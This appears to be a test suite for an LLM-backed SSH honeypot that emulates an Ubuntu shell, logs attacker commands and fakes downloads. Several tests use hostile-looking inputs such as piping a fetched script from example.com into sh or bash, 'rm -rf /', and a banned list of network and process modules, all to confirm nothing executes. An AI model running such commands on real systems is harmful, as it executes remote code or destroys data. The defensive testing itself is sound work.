import assert from "node:assert";
import { existsSync, mkdtempSync, readFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import test from "node:test";
import ssh2 from "ssh2";
import { loadConfig } from "../../../packages/shared/src/config.js";
import { validateEvent } from "../../../packages/shared/src/event.js";
import { createFileSink } from "../../../packages/shared/src/event-sink.js";
import { createLogger } from "../../../packages/shared/src/logger.js";
import { makeKey } from "../../../packages/llm/src/cache.js";
import { createLlmService } from "../../../packages/llm/src/service.js";
import { createVfs } from "../src/vfs.js";
import { buildSeed, uidForUser } from "../src/seed/ubuntu-2204.js";
import { createCommandEngine } from "../src/commands.js";
import { generateEd25519HostKey } from "../src/hostkey.js";
import { createSshHoneypot } from "../src/server.js";

const silentLogger = createLogger({ level: "silent" });
const { Client } = ssh2;
const FIXED_NOW = Date.parse("2026-10-26T14:03:11Z");

function makeEngine(username = "root", overrides = {}) {
  const vfs = createVfs(buildSeed("srv-web-01"));
  vfs.ensureUserHome(username);
  const config = {
    SSH_LLM_DEADLINE_MS: 8000,
    SSH_MAX_FILE_BYTES: 65536,
    SSH_MAX_NODES: 2000,
    HONEYPOT_STATIC_FIRST: true,
    ...(overrides.config || {}),
  };
  return createCommandEngine({
    vfs,
    user: { name: username, uid: uidForUser(username) },
    hostname: "srv-web-01",
    llm: overrides.llm || null,
    config,
    sessionId: overrides.sessionId || "test-session-1",
    sourceIp: overrides.sourceIp || "10.0.0.5",
    now: overrides.now || (() => FIXED_NOW),
  });
}

function makeFakeLlm(options = {}) {
  const calls = [];
  const llm = {
    calls,
    async respond({ command, ctx }) {
      calls.push({ command, ctx });
      if (options.shouldThrow) throw new Error("fake llm failed");
      if (options.delayMs) await new Promise((resolve) => setTimeout(resolve, options.delayMs));
      if (options.onCall) options.onCall({ command, ctx });
      return {
        output: options.output !== undefined ? options.output : "fake-llm-output\n",
        exitCode: options.exitCode !== undefined ? options.exitCode : 0,
        meta: {
          source: options.source || "llm",
          model: options.model || "fake",
          cached: Boolean(options.cached),
          fallback: false,
          latencyMs: 0,
          reason: null,
          attempts: [],
        },
      };
    },
  };
  return llm;
}

function tempDir() {
  return mkdtempSync(join(tmpdir(), "honeypot-day5-"));
}

function makeServer(overrides = {}) {
  const dir = tempDir();
  const eventsDir = join(dir, "events");
  const hostKeyPath = overrides.SSH_HOST_KEY_PATH || join(dir, "ssh", "host_ed25519");
  const config = loadConfig({
    BIND_HOST: "127.0.0.1",
    SSH_IDLE_TIMEOUT_MS: 10000,
    SSH_MAX_SESSION_MS: 60000,
    SSH_MAX_CONNECTIONS: 50,
    SSH_MAX_CONNECTIONS_PER_IP: 50,
    SSH_MAX_AUTH_ATTEMPTS: 6,
    NODE_ID: "node-01",
    EVENT_DIR: eventsDir,
    SSH_HOST_KEY_PATH: hostKeyPath,
    ...overrides.configOverrides,
  });
  const sink = createFileSink({ dir: eventsDir, service: "ssh", logger: silentLogger });
  const honeypot = createSshHoneypot({ config, sink, hostKeyPath, logger: silentLogger, llmService: overrides.llmService || null });
  return { dir, eventsDir, hostKeyPath, config, sink, honeypot };
}

async function startServer(overrides = {}) {
  const made = makeServer(overrides);
  await made.honeypot.listen(0, "127.0.0.1");
  const port = made.honeypot.address().port;
  return { ...made, port };
}

function readEvents(eventsDir) {
  const file = join(eventsDir, "ssh.jsonl");
  if (!existsSync(file)) return [];
  const text = readFileSync(file, "utf8").trim();
  if (!text) return [];
  return text.split("\n").map((line) => JSON.parse(line));
}

async function waitForEvents(eventsDir, predicate, timeoutMs = 5000) {
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
    const events = readEvents(eventsDir);
    const found = events.filter(predicate);
    if (found.length > 0) return found;
    await new Promise((resolve) => setTimeout(resolve, 50));
  }
  throw new Error(`Timed out waiting for events in ${eventsDir}: ${JSON.stringify(readEvents(eventsDir))}`);
}

function connectClient(port, options) {
  const client = new Client();
  let readyResolve;
  let closeResolve;
  const readyPromise = new Promise((resolve) => {
    readyResolve = resolve;
  });
  const closePromise = new Promise((resolve) => {
    closeResolve = resolve;
  });
  client.on("ready", () => readyResolve("ready"));
  client.on("close", () => closeResolve("close"));
  client.on("error", () => readyResolve("error"));
  client.connect({
    host: "127.0.0.1",
    port,
    username: options.username,
    password: options.password,
    readyTimeout: 5000,
  });
  return {
    client,
    waitReadyOrClose: () => readyPromise,
    closePromise,
  };
}

async function shellRun(port, username, password, commands, waitMs = 800) {
  const conn = connectClient(port, { username, password });
  assert.equal(await conn.waitReadyOrClose(), "ready");
  let output = "";
  const stream = await new Promise((resolve, reject) => {
    conn.client.shell((error, shellStream) => {
      if (error) {
        reject(error);
        return;
      }
      resolve(shellStream);
    });
  });
  stream.on("data", (data) => {
    output += data.toString();
  });
  for (const command of commands) {
    stream.write(command);
    await new Promise((resolve) => setTimeout(resolve, 50));
  }
  await new Promise((resolve) => setTimeout(resolve, waitMs));
  return { conn, stream, getOutput: () => output };
}

test("cmd: unknown command is answered by the LLM service", async () => {
  const llm = makeFakeLlm({ output: "llm-answer-here\n", exitCode: 7 });
  const engine = makeEngine("root", { llm });
  const result = await engine.run("nmap -sV 127.0.0.1");
  assert.equal(result.output, "llm-answer-here\n");
  assert.equal(result.exitCode, 7);
  assert.equal(llm.calls.length, 1);
  assert.equal(llm.calls[0].command, "nmap -sV 127.0.0.1");
});

test("cmd: LLM answer keeps exit code and reports handledBy", async () => {
  const llm = makeFakeLlm({ output: "custom-llm\n", exitCode: 42 });
  const engine = makeEngine("root", { llm });
  const result = await engine.run("someunknowncmd");
  assert.equal(result.exitCode, 42);
  assert.equal(result.handledBy, "llm");
  assert.equal(result.output, "custom-llm\n");
});

test("cmd: slow LLM answer is replaced by static answer at the deadline", async () => {
  const llm = makeFakeLlm({ output: "slow-llm-should-not-appear\n", delayMs: 500 });
  const engine = makeEngine("root", { llm, config: { SSH_LLM_DEADLINE_MS: 50, HONEYPOT_STATIC_FIRST: false } });
  const result = await engine.run("ps aux");
  assert.ok(!result.output.includes("slow-llm-should-not-appear"));
  assert.ok(result.output.includes("sshd"));
  assert.equal(result.handledBy, "static");
});

test("cmd: late LLM answer after the deadline is discarded", async () => {
  const llm = makeFakeLlm({ output: "late-llm-output\n", delayMs: 300 });
  const engine = makeEngine("root", { llm, config: { SSH_LLM_DEADLINE_MS: 50, HONEYPOT_STATIC_FIRST: false } });
  const result = await engine.run("ps aux");
  assert.ok(!result.output.includes("late-llm-output"));
  await new Promise((resolve) => setTimeout(resolve, 400));
  assert.ok(!result.output.includes("late-llm-output"));
  assert.ok(result.output.includes("nginx"));
});

test("cmd: LLM failure never throws", async () => {
  const llm = makeFakeLlm({ shouldThrow: true });
  const engine = makeEngine("root", { llm });
  const result = await engine.run("weirdcmd123");
  assert.equal(typeof result.output, "string");
  assert.equal(result.exitCode, 127);
  assert.ok(result.output.includes("command not found"));
});

test("cmd: lines with pipes and subshells go to the LLM", async () => {
  const llm = makeFakeLlm({ output: "pipe-llm\n", exitCode: 0 });
  const engine = makeEngine("root", { llm });
  const pipeResult = await engine.run("ls | grep foo");
  assert.equal(pipeResult.output, "pipe-llm\n");
  assert.equal(pipeResult.handledBy, "llm");
  const subResult = await engine.run("echo $(whoami)");
  assert.equal(subResult.output, "pipe-llm\n");
  assert.equal(llm.calls.length, 2);
});

test("cmd: pipe into sh or bash is never executed and prints nothing", async () => {
  const llm = makeFakeLlm({ output: "should-not-be-called\n" });
  const engine = makeEngine("root", { llm });
  const result = await engine.run("curl http://example.com/x.sh | sh");
  assert.equal(result.output, "");
  assert.equal(result.exitCode, 0);
  assert.equal(result.handled, true);
  assert.equal(llm.calls.length, 0);
  const bashResult = await engine.run("wget http://example.com/a | bash");
  assert.equal(bashResult.output, "");
  assert.equal(bashResult.exitCode, 0);
  assert.equal(llm.calls.length, 0);
});

test("fs: mkdir creates a directory visible to ls", async () => {
  const engine = makeEngine("root");
  const made = await engine.run("mkdir /tmp/newdir");
  assert.equal(made.exitCode, 0);
  const listed = await engine.run("ls /tmp");
  assert.ok(listed.output.includes("newdir"));
});

test("fs: mkdir -p creates parents", async () => {
  const engine = makeEngine("root");
  const made = await engine.run("mkdir -p /tmp/a/b/c");
  assert.equal(made.exitCode, 0);
  const listed = await engine.run("ls /tmp/a/b");
  assert.ok(listed.output.includes("c"));
});

test("fs: mkdir on an existing path prints the error", async () => {
  const engine = makeEngine("root");
  const result = await engine.run("mkdir /tmp");
  assert.ok(result.output.includes("File exists"));
  assert.equal(result.exitCode, 1);
});

test("fs: touch creates an empty file", async () => {
  const engine = makeEngine("root");
  const made = await engine.run("touch /tmp/empty.txt");
  assert.equal(made.exitCode, 0);
  const cat = await engine.run("cat /tmp/empty.txt");
  assert.equal(cat.output, "");
  assert.equal(cat.exitCode, 0);
});

test("fs: rm removes a file and missing file prints the error", async () => {
  const engine = makeEngine("root");
  await engine.run("touch /tmp/gone.txt");
  const removed = await engine.run("rm /tmp/gone.txt");
  assert.equal(removed.exitCode, 0);
  const after = await engine.run("ls /tmp");
  assert.ok(!after.output.includes("gone.txt"));
  const missing = await engine.run("rm /tmp/nope.txt");
  assert.ok(missing.output.includes("No such file or directory"));
  assert.equal(missing.exitCode, 1);
});

test("fs: rm on a directory needs -r", async () => {
  const engine = makeEngine("root");
  await engine.run("mkdir /tmp/rmdirtest");
  const result = await engine.run("rm /tmp/rmdirtest");
  assert.ok(result.output.includes("Is a directory"));
  assert.equal(result.exitCode, 1);
  const withR = await engine.run("rm -r /tmp/rmdirtest");
  assert.equal(withR.exitCode, 0);
});

test("fs: rm -rf on a missing path is silent", async () => {
  const engine = makeEngine("root");
  const result = await engine.run("rm -rf /tmp/definitely-missing-xyz");
  assert.equal(result.output, "");
  assert.equal(result.exitCode, 0);
});

test("fs: rm -rf / is refused like real rm", async () => {
  const engine = makeEngine("root");
  await engine.run("touch /tmp/keepme.txt");
  const result = await engine.run("rm -rf /");
  assert.ok(result.output.includes("it is dangerous to operate recursively on '/'"));
  assert.ok(result.output.includes("use --no-preserve-root to override this failsafe"));
  assert.equal(result.exitCode, 1);
  const after = await engine.run("ls /tmp");
  assert.ok(after.output.includes("keepme.txt"));
});

test("fs: rmdir only removes empty directories", async () => {
  const engine = makeEngine("root");
  await engine.run("mkdir /tmp/emptydir");
  await engine.run("mkdir /tmp/fulldir");
  await engine.run("touch /tmp/fulldir/file.txt");
  const full = await engine.run("rmdir /tmp/fulldir");
  assert.ok(full.output.includes("Directory not empty"));
  assert.equal(full.exitCode, 1);
  const empty = await engine.run("rmdir /tmp/emptydir");
  assert.equal(empty.exitCode, 0);
});

test("fs: cp and mv copy and move files", async () => {
  const engine = makeEngine("root");
  await engine.run("echo hello > /tmp/src.txt");
  const copied = await engine.run("cp /tmp/src.txt /tmp/dst.txt");
  assert.equal(copied.exitCode, 0);
  const catDst = await engine.run("cat /tmp/dst.txt");
  assert.ok(catDst.output.includes("hello"));
  const moved = await engine.run("mv /tmp/dst.txt /tmp/moved.txt");
  assert.equal(moved.exitCode, 0);
  const catMoved = await engine.run("cat /tmp/moved.txt");
  assert.ok(catMoved.output.includes("hello"));
  const catOld = await engine.run("cat /tmp/dst.txt");
  assert.ok(catOld.output.includes("No such file or directory"));
});

test("fs: chmod changes the mode shown by ls -l", async () => {
  const engine = makeEngine("root");
  await engine.run("touch /tmp/mode.txt");
  await engine.run("chmod 755 /tmp/mode.txt");
  const listed = await engine.run("ls -l /tmp/mode.txt");
  assert.ok(listed.output.includes("rwxr-xr-x"));
  await engine.run("chmod -x /tmp/mode.txt");
  const listed2 = await engine.run("ls -l /tmp/mode.txt");
  assert.ok(listed2.output.includes("rw-r--r--"));
});

test("fs: echo redirect creates and appends to a file", async () => {
  const engine = makeEngine("root");
  const first = await engine.run("echo first > /tmp/redir.txt");
  assert.equal(first.exitCode, 0);
  assert.equal(first.output, "");
  const cat1 = await engine.run("cat /tmp/redir.txt");
  assert.equal(cat1.output, "first\n");
  const second = await engine.run("echo second >> /tmp/redir.txt");
  assert.equal(second.exitCode, 0);
  const cat2 = await engine.run("cat /tmp/redir.txt");
  assert.equal(cat2.output, "first\nsecond\n");
});

test("fs: non-root cannot write under /root or /etc", async () => {
  const engine = makeEngine("ubuntu");
  const mkdirRoot = await engine.run("mkdir /root/newdir");
  assert.ok(mkdirRoot.output.includes("Permission denied"));
  assert.equal(mkdirRoot.exitCode, 1);
  const touchEtc = await engine.run("touch /etc/newfile");
  assert.ok(touchEtc.output.includes("Permission denied"));
  assert.equal(touchEtc.exitCode, 1);
});

test("fs: per-session limits return No space left on device", async () => {
  const engine = makeEngine("root", { config: { SSH_MAX_FILE_BYTES: 10 } });
  const result = await engine.run("echo this-is-way-too-long-for-ten-bytes > /tmp/big.txt");
  assert.ok(result.output.includes("No space left on device"));
  assert.equal(result.exitCode, 1);
  const engine2 = makeEngine("root", { config: { SSH_MAX_NODES: 30 } });
  const mkdirResult = await engine2.run("mkdir /tmp/limitdir");
  assert.ok(mkdirResult.output.includes("No space left on device"));
  assert.equal(mkdirResult.exitCode, 1);
});

test("fs: changes never leak between sessions", async () => {
  const first = makeEngine("root");
  const second = makeEngine("root");
  await first.run("touch /tmp/session-only.txt");
  const listed = await second.run("ls /tmp");
  assert.ok(!listed.output.includes("session-only.txt"));
});

test("transfer: wget logs the URL and never touches the network (stub globalThis.fetch to throw and assert it was never called)", async () => {
  const originalFetch = globalThis.fetch;
  let fetchCalled = false;
  globalThis.fetch = async () => {
    fetchCalled = true;
    throw new Error("network should never be called");
  };
  try {
    const engine = makeEngine("root");
    const result = await engine.run("wget http://example.com/file.txt");
    assert.ok(result.output.includes("example.com"));
    assert.ok(result.output.includes("200 OK"));
    assert.equal(fetchCalled, false);
    assert.equal(result.exitCode, 0);
  } finally {
    globalThis.fetch = originalFetch;
  }
});

test("transfer: wget saves a placeholder file named from the URL", async () => {
  const engine = makeEngine("root");
  const result = await engine.run("wget http://example.com/report.pdf");
  assert.equal(result.exitCode, 0);
  const listed = await engine.run("ls /root");
  assert.ok(listed.output.includes("report.pdf"));
});

test("transfer: wget -O and curl -o and -O choose the file name", async () => {
  const engine = makeEngine("root");
  await engine.run("wget -O custom1.bin http://example.com/a.bin");
  await engine.run("curl -o custom2.bin http://example.com/b.bin");
  await engine.run("curl -O http://example.com/c.bin");
  const listed = await engine.run("ls /root");
  assert.ok(listed.output.includes("custom1.bin"));
  assert.ok(listed.output.includes("custom2.bin"));
  assert.ok(listed.output.includes("c.bin"));
});

test("transfer: downloaded files are fixed harmless placeholders", async () => {
  const engine = makeEngine("root");
  await engine.run("wget http://example.com/evil.sh");
  const cat = await engine.run("cat /root/evil.sh");
  assert.equal(cat.output, "# placeholder");
  const listed = await engine.run("ls -l /root/evil.sh");
  assert.ok(listed.output.includes("rw-r--r--"));
});

test("cmd: running a downloaded file never executes anything", async () => {
  const engine = makeEngine("root");
  await engine.run("wget http://example.com/run.sh");
  await engine.run("chmod +x /root/run.sh");
  const direct = await engine.run("./run.sh");
  assert.equal(direct.output, "");
  assert.equal(direct.exitCode, 0);
  const viaBash = await engine.run("bash /root/run.sh");
  assert.equal(viaBash.output, "");
  assert.equal(viaBash.exitCode, 0);
  const missing = await engine.run("./nope.sh");
  assert.ok(missing.output.includes("No such file or directory"));
  assert.equal(missing.exitCode, 127);
});

test("transfer: plain curl goes to the LLM", async () => {
  const llm = makeFakeLlm({ output: "curl-llm-answer\n" });
  const engine = makeEngine("root", { llm });
  const result = await engine.run("curl http://example.com/api");
  assert.equal(result.output, "curl-llm-answer\n");
  assert.equal(result.handledBy, "llm");
  assert.equal(llm.calls.length, 1);
});

test("notes: capped at 10 items of 120 chars", async () => {
  const engine = makeEngine("root");
  for (let i = 0; i < 12; i += 1) {
    await engine.run(`wget http://example.com/file${i}.txt`);
  }
  const notes = engine.getNotes();
  assert.equal(notes.length, 10);
  for (const note of notes) assert.ok(note.length <= 120);
  assert.ok(!notes.some((note) => note.includes("file0.txt")));
  assert.ok(notes.some((note) => note.includes("file11.txt")));
});

test("notes: downloads and root package installs are recorded, failed installs are not", async () => {
  const llm = makeFakeLlm({ output: "install-ok\n", exitCode: 0 });
  const engine = makeEngine("root", { llm });
  await engine.run("wget http://example.com/tool.bin");
  await engine.run("apt install nginx");
  const failingLlm = makeFakeLlm({ output: "install-failed\n", exitCode: 1 });
  const engine2 = makeEngine("root", { llm: failingLlm });
  await engine2.run("apt install brokenpkg");
  assert.ok(engine.getNotes().some((note) => note.includes("downloaded tool.bin")));
  assert.ok(engine.getNotes().some((note) => note.includes("installed: nginx")));
  assert.ok(!engine2.getNotes().some((note) => note.includes("brokenpkg")));
});

test("prompt: session notes appear in the user message as data", async () => {
  let recordedBody = null;
  const fetchImpl = async (url, init) => {
    recordedBody = JSON.parse(init.body);
    return {
      ok: true,
      status: 200,
      headers: { get: () => null },
      json: async () => ({
        candidates: [{ content: { parts: [{ text: JSON.stringify({ output: "ok", exitCode: 0 }) }] }, finishReason: "STOP" }],
        usageMetadata: { promptTokenCount: 10, candidatesTokenCount: 5 },
      }),
    };
  };
  const config = loadConfig({
    LLM_MODE: "real",
    GEMINI_API_KEY: "FAKE-KEY-123",
    GEMINI_MODEL: "gemini-2.5-flash-lite",
    GEMINI_FALLBACK_MODEL: "gemini-2.5-flash",
  });
  const service = createLlmService({ config, logger: silentLogger, fetchImpl });
  await service.respond({ command: "ls", ctx: { user: "root", cwd: "/root", hostname: "srv-web-01", sessionId: "s1", notes: ["downloaded x in /root"] } });
  const userText = recordedBody.contents[0].parts[0].text;
  assert.ok(userText.includes(JSON.stringify(["downloaded x in /root"])));
  assert.ok(userText.toLowerCase().includes("untrusted"));
  const systemText = recordedBody.systemInstruction.parts[0].text;
  assert.ok(!systemText.includes("downloaded x in /root"));
});

test("cache: different notes give a different key", () => {
  const base = { personaId: "ubuntu-2204", hostname: "srv-web-01", user: "root", cwd: "/root", command: "ls" };
  const key1 = makeKey({ ...base, notes: ["a"] });
  const key2 = makeKey({ ...base, notes: ["b"] });
  const key3 = makeKey({ ...base, notes: ["a"] });
  assert.notEqual(key1, key2);
  assert.equal(key1, key3);
});

test("cmd: command modules import no fs, network or process modules", async () => {
  const here = dirname(fileURLToPath(import.meta.url));
  const files = [
    join(here, "..", "src", "vfs.js"),
    join(here, "..", "src", "commands.js"),
    join(here, "..", "src", "parser.js"),
    join(here, "..", "src", "transfers.js"),
    join(here, "..", "..", "..", "packages", "llm", "src", "static.js"),
    join(here, "..", "..", "..", "packages", "llm", "src", "persona-facts.js"),
    join(here, "..", "src", "seed", "ubuntu-2204.js"),
  ];
  const banned = ["node:fs", "node:net", "node:http", "node:https", "node:dns", "node:dgram", "node:tls", "node:" + "child" + "_process"];
  for (const file of files) {
    const text = readFileSync(file, "utf8");
    for (const bannedModule of banned) {
      assert.ok(!text.includes(bannedModule), `${file} imports ${bannedModule}`);
    }
  }
});

test("static-first: ps, netstat, ss and ifconfig are answered without calling the LLM", async () => {
  const llm = makeFakeLlm({ shouldThrow: true });
  const engine = makeEngine("root", { llm });
  for (const command of ["ps aux", "netstat -tulpn", "ss -tuln", "ifconfig"]) {
    const result = await engine.run(command);
    assert.equal(result.handledBy, "static");
    assert.ok(result.output.length > 0);
  }
  assert.equal(llm.calls.length, 0);
});

test("static-first: ps and netstat agree on pids and programs", async () => {
  const engine = makeEngine("root");
  const ps = await engine.run("ps aux");
  const netstat = await engine.run("netstat -tulpn");
  assert.ok(ps.output.includes("342"));
  assert.ok(ps.output.includes("sshd"));
  assert.ok(ps.output.includes("512"));
  assert.ok(ps.output.includes("nginx"));
  assert.ok(netstat.output.includes("342/sshd"));
  assert.ok(netstat.output.includes("512/nginx"));
});

test("static-first: ps shows the attacker's own shell and the ps command", async () => {
  const engine = makeEngine("ubuntu", { sourceIp: "10.0.0.5" });
  const ps = await engine.run("ps aux");
  assert.ok(ps.output.includes("ubuntu"));
  assert.ok(ps.output.includes("-bash"));
  assert.ok(ps.output.includes("sshd: ubuntu@pts/0"));
  assert.ok(ps.output.includes("ps aux"));
});

test("static-first: date prints the current clock in UTC", async () => {
  const engine = makeEngine("root");
  const result = await engine.run("date");
  assert.ok(result.output.includes("Mon Oct 26 14:03:11 UTC 2026"));
});

test("static-first: uptime and process start times agree with the boot time", async () => {
  const engine = makeEngine("root");
  const uptime = await engine.run("uptime");
  assert.ok(uptime.output.includes("up 42 days"));
  const ps = await engine.run("ps aux");
  assert.ok(ps.output.includes("Sep14"));
});

test("static-first: handledBy is static for table commands", async () => {
  const engine = makeEngine("root");
  for (const command of ["ps aux", "df -h", "free -m", "uptime", "who"]) {
    const result = await engine.run(command);
    assert.equal(result.handledBy, "static");
  }
});

test("static-first: HONEYPOT_STATIC_FIRST=false sends them to the LLM", async () => {
  const llm = makeFakeLlm({ output: "llm-ps-answer\n" });
  const engine = makeEngine("root", { llm, config: { HONEYPOT_STATIC_FIRST: false } });
  const result = await engine.run("ps aux");
  assert.equal(result.output, "llm-ps-answer\n");
  assert.equal(llm.calls.length, 1);
});

test("static-first: unsupported flags and other commands still go to the LLM", async () => {
  const llm = makeFakeLlm({ output: "llm-other\n" });
  const engine = makeEngine("root", { llm });
  const flagResult = await engine.run("ps -xyz");
  assert.equal(flagResult.output, "llm-other\n");
  const otherResult = await engine.run("nmap localhost");
  assert.equal(otherResult.output, "llm-other\n");
  assert.equal(llm.calls.length, 2);
});

test("ssh: unknown command in the shell shows the LLM output", async () => {
  const llm = makeFakeLlm({ output: "ssh-llm-output\n" });
  const made = await startServer({ llmService: llm });
  try {
    const { conn, stream, getOutput } = await shellRun(made.port, "root", "123456", ["nmap localhost\n"], 800);
    assert.ok(getOutput().includes("ssh-llm-output"));
    conn.client.end();
    await conn.closePromise;
  } finally {
    await made.honeypot.close();
    rmSync(made.dir, { recursive: true, force: true });
  }
});

test("ssh: input typed while a command is pending is queued", async () => {
  let callCount = 0;
  const llm = {
    calls: [],
    async respond({ command, ctx }) {
      this.calls.push({ command, ctx });
      callCount += 1;
      if (callCount === 1) await new Promise((resolve) => setTimeout(resolve, 400));
      return { output: "slow-llm-done\n", exitCode: 0, meta: { source: "llm", model: "fake", cached: false, fallback: false, latencyMs: 0, reason: null, attempts: [] } };
    },
  };
  const made = await startServer({ llmService: llm });
  try {
    const conn = connectClient(made.port, { username: "root", password: "123456" });
    assert.equal(await conn.waitReadyOrClose(), "ready");
    let output = "";
    const stream = await new Promise((resolve, reject) => {
      conn.client.shell((error, shellStream) => {
        if (error) {
          reject(error);
          return;
        }
        resolve(shellStream);
      });
    });
    stream.on("data", (data) => {
      output += data.toString();
    });
    await new Promise((resolve) => setTimeout(resolve, 200));
    stream.write("nmap localhost\n");
    await new Promise((resolve) => setTimeout(resolve, 50));
    stream.write("pwd\n");
    await new Promise((resolve) => setTimeout(resolve, 1200));
    assert.ok(output.includes("slow-llm-done"));
    assert.ok(output.includes("/root"));
    const events = await waitForEvents(made.eventsDir, (event) => event.eventType === "command" && event.payload.command === "pwd");
    assert.equal(events.length, 1);
    conn.client.end();
    await conn.closePromise;
  } finally {
    await made.honeypot.close();
    rmSync(made.dir, { recursive: true, force: true });
  }
});

test("ssh: Ctrl+C while pending shows a new prompt and drops the answer", async () => {
  const llm = makeFakeLlm({ output: "late-llm-should-not-appear\n", delayMs: 500 });
  const made = await startServer({ llmService: llm });
  try {
    const conn = connectClient(made.port, { username: "root", password: "123456" });
    assert.equal(await conn.waitReadyOrClose(), "ready");
    let output = "";
    const stream = await new Promise((resolve, reject) => {
      conn.client.shell((error, shellStream) => {
        if (error) {
          reject(error);
          return;
        }
        resolve(shellStream);
      });
    });
    stream.on("data", (data) => {
      output += data.toString();
    });
    await new Promise((resolve) => setTimeout(resolve, 200));
    stream.write("nmap localhost\n");
    await new Promise((resolve) => setTimeout(resolve, 100));
    stream.write("\x03");
    await new Promise((resolve) => setTimeout(resolve, 900));
    assert.ok(output.includes("^C"));
    assert.ok(!output.includes("late-llm-should-not-appear"));
    stream.write("pwd\n");
    await new Promise((resolve) => setTimeout(resolve, 500));
    assert.ok(output.includes("/root"));
    conn.client.end();
    await conn.closePromise;
  } finally {
    await made.honeypot.close();
    rmSync(made.dir, { recursive: true, force: true });
  }
});

test("ssh: exec waits for the async answer and returns its exit code", async () => {
  const llm = makeFakeLlm({ output: "exec-llm-output\n", exitCode: 42, delayMs: 200 });
  const made = await startServer({ llmService: llm });
  try {
    const conn = connectClient(made.port, { username: "root", password: "123456" });
    assert.equal(await conn.waitReadyOrClose(), "ready");
    const result = await new Promise((resolve, reject) => {
      conn.client.exec("nmap localhost", (error, stream) => {
        if (error) {
          reject(error);
          return;
        }
        let output = "";
        let code = null;
        stream.on("data", (data) => {
          output += data.toString();
        });
        stream.on("exit", (exitCode) => {
          code = exitCode;
        });
        stream.on("close", () => resolve({ output, code }));
      });
    });
    assert.ok(result.output.includes("exec-llm-output"));
    assert.equal(result.code, 42);
    conn.client.end();
    await conn.closePromise;
  } finally {
    await made.honeypot.close();
    rmSync(made.dir, { recursive: true, force: true });
  }
});

test("ssh: llm_response event is emitted with llm meta", async () => {
  const llm = makeFakeLlm({ output: "llm-event-output\n" });
  const made = await startServer({ llmService: llm });
  try {
    const conn = connectClient(made.port, { username: "root", password: "123456" });
    assert.equal(await conn.waitReadyOrClose(), "ready");
    const result = await new Promise((resolve, reject) => {
      conn.client.exec("nmap localhost", (error, stream) => {
        if (error) {
          reject(error);
          return;
        }
        let output = "";
        stream.on("data", (data) => {
          output += data.toString();
        });
        stream.on("close", () => resolve({ output }));
      });
    });
    assert.ok(result.output.includes("llm-event-output"));
    const events = await waitForEvents(made.eventsDir, (event) => event.eventType === "llm_response");
    assert.equal(events[0].payload.command, "nmap localhost");
    assert.ok(events[0].payload.outputLength > 0);
    assert.ok(events[0].payload.outputPreview.includes("llm-event-output"));
    assert.equal(events[0].llm.used, true);
    assert.equal(events[0].llm.model, "fake");
    conn.client.end();
    await conn.closePromise;
  } finally {
    await made.honeypot.close();
    rmSync(made.dir, { recursive: true, force: true });
  }
});

test("ssh: command event includes handledBy", async () => {
  const llm = makeFakeLlm({ output: "handledby-llm\n" });
  const made = await startServer({ llmService: llm });
  try {
    const conn = connectClient(made.port, { username: "root", password: "123456" });
    assert.equal(await conn.waitReadyOrClose(), "ready");
    await new Promise((resolve, reject) => {
      conn.client.exec("nmap localhost", (error, stream) => {
        if (error) {
          reject(error);
          return;
        }
        stream.on("data", () => {});
        stream.on("close", () => resolve());
      });
    });
    const events = await waitForEvents(made.eventsDir, (event) => event.eventType === "command" && event.payload.command === "nmap localhost");
    assert.equal(events[0].payload.handledBy, "llm");
    conn.client.end();
    await conn.closePromise;
  } finally {
    await made.honeypot.close();
    rmSync(made.dir, { recursive: true, force: true });
  }
});

test("ssh: file_transfer event has tool, url and savedAs", async () => {
  const made = await startServer({});
  try {
    const { conn, getOutput } = await shellRun(made.port, "root", "123456", ["wget http://example.com/file.txt\n"], 800);
    assert.ok(getOutput().includes("example.com"));
    const events = await waitForEvents(made.eventsDir, (event) => event.eventType === "file_transfer");
    assert.equal(events[0].payload.tool, "wget");
    assert.equal(events[0].payload.url, "http://example.com/file.txt");
    assert.equal(events[0].payload.savedAs, "file.txt");
    assert.equal(events[0].payload.direction, "download");
    conn.client.end();
    await conn.closePromise;
  } finally {
    await made.honeypot.close();
    rmSync(made.dir, { recursive: true, force: true });
  }
});

test("ssh: all new events pass validateEvent", async () => {
  const llm = makeFakeLlm({ output: "validate-llm\n" });
  const made = await startServer({ llmService: llm });
  try {
    const { conn } = await shellRun(made.port, "root", "123456", ["nmap localhost\n", "wget http://example.com/x.txt\n", "ps aux\n"], 1000);
    const events = readEvents(made.eventsDir);
    assert.ok(events.length > 0);
    for (const event of events) {
      const checked = validateEvent(event);
      assert.equal(checked.ok, true, JSON.stringify(checked.errors));
    }
    assert.ok(events.some((event) => event.eventType === "llm_response"));
    assert.ok(events.some((event) => event.eventType === "file_transfer"));
    assert.ok(events.some((event) => event.eventType === "command" && event.payload.handledBy));
    conn.client.end();
    await conn.closePromise;
  } finally {
    await made.honeypot.close();
    rmSync(made.dir, { recursive: true, force: true });
  }
});
